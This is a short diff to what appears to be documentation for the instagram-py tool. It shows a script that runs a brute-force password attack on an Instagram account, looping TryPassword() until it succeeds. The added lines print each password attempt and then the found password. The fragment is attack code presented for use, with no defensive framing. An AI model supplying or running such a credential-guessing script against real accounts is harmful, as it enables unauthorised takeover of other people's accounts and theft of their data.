@@ -356,7 +356,11 @@ This is a simple script to conduct a bructe force attack using instagram-py as a
 
  instagrampy = InstagramPyInstance(cli = None ,session = session)
  while not instagrampy.PasswordFound():
+        print('Trying... '+session.CurrentPassword())
         instagrampy.TryPassword()
+
+ if instagrampy.PasswordFound():
+        print('Password Found: '+session.CurrentPassword())
 
  exit(0) 
 
